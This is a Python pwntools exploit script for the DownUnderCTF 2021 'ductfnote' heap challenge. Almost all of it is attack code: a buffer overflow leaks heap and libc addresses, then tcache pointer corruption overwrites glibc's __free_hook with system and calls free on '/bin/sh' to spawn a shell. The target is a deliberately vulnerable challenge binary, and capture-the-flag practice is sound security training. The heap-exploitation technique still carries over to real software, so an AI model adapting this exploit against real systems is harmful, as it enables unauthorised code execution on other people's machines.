from pwn import *

if args.REMOTE:
	r = connect ("pwn-2021.duc.tf", 31917)
elif args.GDB:
	r = gdb.debug ("./ductfnote", """
		c
	""", aslr = False)
else:
	r = process ("./ductfnote")

libc = ELF ("./libc-2.31.so", checksec = False)

def create (size):
	r.recvuntil (b">> ")
	r.sendline (b"1")
	r.recvuntil (b"Size: ")
	r.sendline (str (size).encode ())

def edit (buffer):
	r.recvuntil (b">> ")
	r.sendline (b"3")
	r.recvline ()
	r.sendline (buffer)

def delete ():
	r.recvuntil (b">> ")
	r.sendline (b"4")


# create a chunk to be reallocated later
create (127)
delete ()

# leak chunk
create (10)
delete ()

# back to the previous chunk
create (127)

# set params->maxsize to UINT_MAX
# and enlarge note->size
payload  = b"A" * 212
payload += p64 (0x21)		# params chunk size
payload += p64 (0xffffffff)	# params maxsize
payload += b"A" * 16
payload += p64 (0x111)		# note chunk size
payload += p64 (0x1000)		# note size
edit (payload)

r.recvuntil (b">> ")
r.sendline (b"2")
r.recvuntil (b"NOTE 1 ------------>\n")
r.recv (276)
leak = u64 (r.recv (8))
heap = leak - 0x10

# we have the heap offset
log.info ("leak   ---> %#018x", leak)
log.info ("heap   ---> %#018x", heap)


# huge chunk

create (0x380) # base chunk
delete ()
create (0x390) # checkpoint chunk
delete ()
create (0x400) # space chunk

create (0x100) # separator

# back to the base
create (0x380)
# modify the chunk size to the sum of all the chunks we allocated before
payload  = b"A" * 244
payload += p64 (0xbc1)	# note chunk size
edit (payload)

# deallocate the huge chunk
delete ()

# this starts consuming the huge chunk
create (127)

payload  = b"A" * 244
payload += p64 (0x111)	# note chunk size
payload += p64 (0x1000)	# note size
edit (payload)

r.recvuntil (b">> ")
r.sendline (b"2")
r.recv (0x130)

leak = u64 (r.recv (8))
libc_base = leak - 0x1ebbe0
libc.address = libc_base

# here it is the libc
log.info ("leak   ---> %#018x", leak)
log.info ("libc   ---> %#018x", libc_base)


create (0x290) # first freed chunk
delete ()

create (0x2a0) # second freed chunk

payload  = b"A" * 212
payload += p64 (0x3a1)			# checkpoint chunk
payload += b"A" * 8				# forward pointer
payload += p64 (heap + 0x10)	# backward pointer
payload += b"A" * 8
payload += p64 (0x2a1)			# chunk size
edit (payload)

delete ()	# tcache 0x2a0 counter is at 2

create (0x390) # back to checkpoint chunk

payload  = b"A" * 28
payload += p64 (libc.symbols["__free_hook"] - 0x20)	# second freed chunk's backward pointer
edit (payload)

# consume the first bin
create (0x290)

# arbitrary allocated
create (0x290)

# overflow, again...
payload  = b"A" * 28
payload += p64 (libc.symbols["system"])
payload += b"A" * 216
payload += b"/bin/sh\x00"
edit (payload)

# since when does free is also system?
delete ()

r.interactive ()